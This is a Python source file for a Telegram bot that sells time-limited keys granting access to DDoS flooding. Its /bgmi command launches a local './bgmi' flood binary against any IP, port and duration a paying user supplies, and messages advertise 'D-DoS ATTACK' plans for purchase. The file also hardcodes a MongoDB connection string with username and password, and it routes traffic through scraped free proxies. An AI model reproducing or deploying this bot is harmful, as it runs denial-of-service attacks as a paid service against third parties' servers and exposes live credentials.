from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import requests
import subprocess
import json
import os
import random
import string
import datetime
import certifi
from pymongo import MongoClient
import itertools

from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME

USER_FILE = "users.json"
KEY_FILE = "keys.json"

DEFAULT_THREADS = 70
users = {}
keys = {}
user_processes = {}
MONGO_URI = 'mongodb+srv://hnddos:hnddosbot@cluster0.8y5dh.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0'
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())

# Proxy related functions
proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'

proxy_iterator = None

def get_proxies():
    global proxy_iterator
    try:
        response = requests.get(proxy_api_url)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            if proxies:
                proxy_iterator = itertools.cycle(proxies)
                return proxy_iterator
    except Exception as e:
        print(f"Error fetching proxies: {str(e)}")
    return None

def get_next_proxy():
    global proxy_iterator
    if proxy_iterator is None:
        proxy_iterator = get_proxies()
    return next(proxy_iterator, None)

def get_proxy_dict():
    proxy = get_next_proxy()
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None

# Load and save user and key data
def load_data():
    global users, keys
    users = load_users()
    keys = load_keys()

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def load_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading keys: {e}")
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(minutes=0, hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(minutes=minutes, hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        command = context.args
        if len(command) == 2:
            try:
                time_amount = int(command[0])
                time_unit = command[1].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"Key Generated: {key}\nExpire On: {expiration_date}"
            except ValueError:
                response = "Please specify a valid number and unit of time (hours/days)."
        else:
            response = "Usage: /genkey <amount> <hours/days>"
    else:
        response = "Only Owner Can Use This Command @GoTo_HellxD"

    await update.message.reply_text(response)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    command = context.args
    if len(command) == 1:
        key = command[0]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"Verified!"
        else:
            response = "Invalid Or Expired Key Please Contact Admin @GoTo_HellxD"
    else:
        response = "Usage: /redeem <key>"

    await update.message.reply_text(response)

async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        if users:
            response = "Authorized Users:\n"
            for user_id, expiration_date in users.items():
                try:
                    user_info = await context.bot.get_chat(int(user_id), request_kwargs={'proxies': get_proxy_dict()})
                    username = user_info.username if user_info.username else f"UserID: {user_id}"
                    response += f"- @{username} (ID: {user_id}) expires on {expiration_date}\n"
                except Exception:
                    response += f"- User ID: {user_id} expires on {expiration_date}\n"
        else:
            response = "No data found"
    else:
        response = "ONLY ADMIN CAN USE THIS COMMAND"
    await update.message.reply_text(response)

# BGMI Command
bgmi_enabled = True
bgmi_cooldowns = {}
bgmi_cooldown_time = datetime.timedelta(minutes=5)  # Default cooldown

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global user_processes, bgmi_cooldowns, bgmi_cooldown_time
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ YOU HAVE ON ANYONE PLAN DM FOR BUY : - @GoTo_HellxD")
        return

    # Cooldown logic
    if user_id in bgmi_cooldowns:
        if datetime.datetime.now() < bgmi_cooldowns[user_id]:
            remaining_time = (bgmi_cooldowns[user_id] - datetime.datetime.now()).seconds // 60
            await update.message.reply_text(f"Please wait {remaining_time} minutes before using this command again.")
            return

    if len(context.args) != 3:
        await update.message.reply_text('Usage: /bgmi <target_ip> <port> <duration>')
        return

    target_ip = context.args[0]
    port = context.args[1]
    duration = context.args[2]

    command = ['./bgmi', target_ip, port, duration, str(DEFAULT_THREADS)]

    process = subprocess.Popen(command)
    
    user_processes[user_id] = {"process": process, "command": command, "target_ip": target_ip, "port": port}
    
    bgmi_cooldowns[user_id] = datetime.datetime.now() + bgmi_cooldown_time  # Set cooldown
    await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} For {duration}:{DEFAULT_THREADS}\nAttack Running. Don’t put the same IP and port.')

async def bgmicooldown(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global bgmi_cooldown_time
    user_id = str(update.message.from_user.id)

    if user_id not in ADMIN_IDS:
        await update.message.reply_text("Only admins can adjust the cooldown.")
        return

    command = context.args
    if len(command) == 1 and command[0].lower() == 'off':
        bgmi_cooldown_time = datetime.timedelta.max  # Disable cooldown
        await update.message.reply_text("BGMI cooldown disabled.")
        return

    if len(command) == 1:
        try:
            time_value = int(command[0][:-3])
            time_unit = command[0][-3:].lower()  # Last 3 characters (e.g., min, sec, hour)
            if time_unit == 'min':
                bgmi_cooldown_time = datetime.timedelta(minutes=time_value)
            elif time_unit == 'sec':
                bgmi_cooldown_time = datetime.timedelta(seconds=time_value)
            elif time_unit == 'hour':
                bgmi_cooldown_time = datetime.timedelta(hours=time_value)
            else:
                await update.message.reply_text("Invalid time unit. Use min, sec, or hour.")
                return
            await update.message.reply_text(f"BGMI cooldown set to {time_value} {time_unit}.")
        except ValueError:
            await update.message.reply_text("Please provide a valid number followed by a time unit (e.g., 5min, 1hour, 50sec).")
    else:
        await update.message.reply_text("Usage: /bgmicooldown <time> or /bgmicooldown off")

# HN Command
hn_enabled = True
hn_cooldowns = {}
hn_cooldown_time = datetime.timedelta(minutes=5)  # Default cooldown

async def hn(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global hn_cooldowns, hn_cooldown_time
    user_id = str(update.message.from_user.id)
    chat_id = update.message.chat.id

    if chat_id != -1001921212119:  # Check if it's the correct group
        await update.message.reply_text("This command is only for Hunter Clan users.")
        return

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ YOU HAVE ON ANYONE PLAN DM FOR BUY : - @GoTo_HellxD")
        return

    # Cooldown logic
    if user_id in hn_cooldowns:
        if datetime.datetime.now() < hn_cooldowns[user_id]:
            remaining_time = (hn_cooldowns[user_id] - datetime.datetime.now()).seconds // 60
            await update.message.reply_text(f"Please wait {remaining_time} minutes before using this command again.")
            return

    # Your command logic here
    await update.message.reply_text("Executing /hn command...")  # Replace with actual logic

    hn_cooldowns[user_id] = datetime.datetime.now() + hn_cooldown_time  # Set cooldown

async def hncooldown(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global hn_cooldown_time
    user_id = str(update.message.from_user.id)

    if user_id not in ADMIN_IDS:
        await update.message.reply_text("Only admins can adjust the cooldown.")
        return

    command = context.args
    if len(command) == 1 and command[0].lower() == 'off':
        hn_cooldown_time = datetime.timedelta.max  # Disable cooldown
        await update.message.reply_text("HN cooldown disabled.")
        return

    if len(command) == 1:
        try:
            time_value = int(command[0][:-3])
            time_unit = command[0][-3:].lower()  # Last 3 characters (e.g., min, sec, hour)
            if time_unit == 'min':
                hn_cooldown_time = datetime.timedelta(minutes=time_value)
            elif time_unit == 'sec':
                hn_cooldown_time = datetime.timedelta(seconds=time_value)
            elif time_unit == 'hour':
                hn_cooldown_time = datetime.timedelta(hours=time_value)
            else:
                await update.message.reply_text("Invalid time unit. Use min, sec, or hour.")
                return
            await update.message.reply_text(f"HN cooldown set to {time_value} {time_unit}.")
        except ValueError:
            await update.message.reply_text("Please provide a valid number followed by a time unit (e.g., 5min, 1hour, 50sec).")
    else:
        await update.message.reply_text("Usage: /hncooldown <time> or /hncooldown off")

async def hnoff(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global hn_enabled
    user_id = str(update.message.from_user.id)

    if user_id in ADMIN_IDS:
        hn_enabled = False
        await update.message.reply_text("The /hn command has been disabled.")
    else:
        await update.message.reply_text("Only admins can disable the /hn command.")

async def hnon(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global hn_enabled
    user_id = str(update.message.from_user.id)

    if user_id in ADMIN_IDS:
        hn_enabled = True
        await update.message.reply_text("The /hn command has been enabled.")
    else:
        await update.message.reply_text("Only admins can enable the /hn command.")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("👋🏻WELCOME TO D-DoS ATTACK\nTHIS IS A TOOL POWERED BY:-@GoTo_HellxD\n🤖TRY TO RUN THIS COMMANDS :- /help")
        return

    if user_id not in user_processes or user_processes[user_id]["process"].poll() is not None:
        await update.message.reply_text('𝐍𝐨 𝐟𝐥𝐨𝐨𝐝𝐢𝐧𝐠 𝐩𝐚𝐫𝐚𝐦𝐞𝐭𝐞𝐫𝐬 𝐬𝐞𝐭. 𝐔𝐬𝐞 /bgmi 𝐭𝐨 𝐬𝐞𝐭 𝐩𝐚𝐫𝐚𝐦𝐞𝐭𝐞𝐫𝐬.')
        return

    if user_processes[user_id]["process"].poll() is None:
        await update.message.reply_text('🚀 ATTACK RUNNING 🚀')
        return

    user_processes[user_id]["process"] = subprocess.Popen(user_processes[user_id]["command"])
    await update.message.reply_text('🚀 STARTED ATTACK 🚀.')

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌𝐀𝐜𝐜𝐞𝐬𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝 𝐨𝐫 𝐮𝐧𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐛𝐮𝐲 𝐤𝐞𝐲 𝐟𝐫𝐨𝐦- @GoTo_HellxD")
        return

    if user_id not in user_processes or user_processes[user_id]["process"].poll() is not None:
        await update.message.reply_text('❌ ATTACK STOPPED ❌')
        return

    user_processes[user_id]["process"].terminate()
    del user_processes[user_id]  # Clear the stored parameters
    
    await update.message.reply_text('❌ ATTACK STOPPED ❌.')

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        message = ' '.join(context.args)
        if not message:
            await update.message.reply_text('Usage: /broadcast <message>')
            return

        for user in users.keys():
            try:
                await context.bot.send_message(chat_id=int(user), text=message, request_kwargs={'proxies': get_proxy_dict()})
            except Exception as e:
                print(f"Error sending message to {user}: {e}")
        response = "Message sent to all users."
    else:
        response = "ONLY OWNER CAN USE."
    
    await update.message.reply_text(response)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒:\n/redeem <𝐑𝐄𝐃𝐄𝐄𝐌 𝐊𝐄𝐘>\n/stop <𝐅𝐎𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐎𝐏>\n/start <𝐅𝐎𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓>\n/genkey <𝐡𝐨𝐮𝐫𝐬/𝐝𝐚𝐲𝐬>\n/bgmioff <𝐃𝐈𝐒𝐀𝐁𝐋𝐄 𝐁𝐆𝐌𝐈>\n/bgmion <𝐄𝐍𝐀𝐁𝐋𝐄 𝐁𝐆𝐌𝐈>\n/hn <𝐇𝐍 𝐂𝐎𝐌𝐌𝐀𝐍𝐃>\n/hnoff <𝐃𝐈𝐒𝐀𝐁𝐋𝐄 𝐇𝐍>\n/hnon <𝐄𝐍𝐀𝐁𝐋𝐄 𝐇𝐍>\n/bgmicooldown <time> <or> /bgmicooldown off\n/hncooldown <time> <or> /hncooldown off\n𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 𝐖𝐎𝐑𝐊𝐈𝐍𝐆 𝐀𝐅𝐓𝐄𝐑 𝐁𝐔𝐘 𝐏𝐋𝐀𝐍, 𝐃𝐌 𝐅𝐎𝐑 𝐁𝐔𝐘 𝐘𝐎𝐔𝐑 𝐎𝐖𝐍 𝐏𝐋𝐀𝐍 : - @GoTo_HellxD")

if __name__ == '__main__':
    load_data()
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("genkey", genkey))
    app.add_handler(CommandHandler("bgmi", bgmi))
    app.add_handler(CommandHandler("bgmicooldown", bgmicooldown))
    app.add_handler(CommandHandler("hn", hn))
    app.add_handler(CommandHandler("hncooldown", hncooldown))
    app.add_handler(CommandHandler("allusers", allusers))
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("help", help_command))

    app.run_polling()
